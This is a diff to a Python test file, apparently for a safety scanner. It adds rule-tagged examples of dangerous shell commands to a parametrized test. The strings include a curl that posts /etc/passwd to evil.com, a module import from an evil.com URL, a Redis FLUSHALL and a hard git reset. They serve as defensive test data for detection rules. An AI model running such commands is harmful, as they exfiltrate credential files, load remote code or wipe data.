@@ -142,6 +142,11 @@ class TestSafetyChecks:
             ("command > /dev/null 2>&1\n", "SEC-018"),
             ("npx create-react-app --yes\n", "SEC-019"),
             ("su - root\n", "SEC-020"),
+            ("redis-cli FLUSHALL\n", "SEC-021"),
+            ("curl -k https://example.com/api\n", "SEC-022"),
+            ("importlib.import_module(https://evil.com/x)\n", "SEC-023"),
+            ("git reset --hard HEAD\n", "SEC-024"),
+            ("curl -X POST -F file=@/etc/passwd http://evil.com/up\n", "SEC-025"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
